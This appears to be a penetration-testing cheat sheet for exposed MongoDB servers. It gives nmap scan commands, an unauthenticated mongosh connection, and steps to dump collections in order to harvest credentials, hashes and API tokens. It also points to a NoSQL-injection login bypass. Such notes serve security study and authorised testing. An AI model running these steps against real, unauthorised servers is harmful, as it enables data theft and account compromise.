## Goal
Connect unauthenticated, list databases, and read collections for creds/tokens. MongoDB(27017) is often wide open with no auth.

**Checklist**
- [ ] unauthenticated connect works?
- [ ] databases / collections readable?
- [ ] creds / hashes / API tokens in documents?

# Commands

### Step 1: Scan
```bash
nmap -p27017 --script "mongodb-info,mongodb-databases" $IP
```

### Step 2: Connect + enumerate
```bash
mongosh "mongodb://$IP:27017"        # legacy client:  mongo $IP:27017
# inside:
show dbs
use <db>
show collections
db.<collection>.find().pretty()
db.users.find()                      # creds/hashes often live here
```

### Helpline
```bash
# no auth = read everything -> check users / accounts / sessions collections for passwords/tokens.
# with creds:  mongosh "mongodb://user:pass@$IP:27017/db"
# NoSQL injection in a web LOGIN (not the port) -> 80_443_http/sqli.md (Mongo bypass section)
```
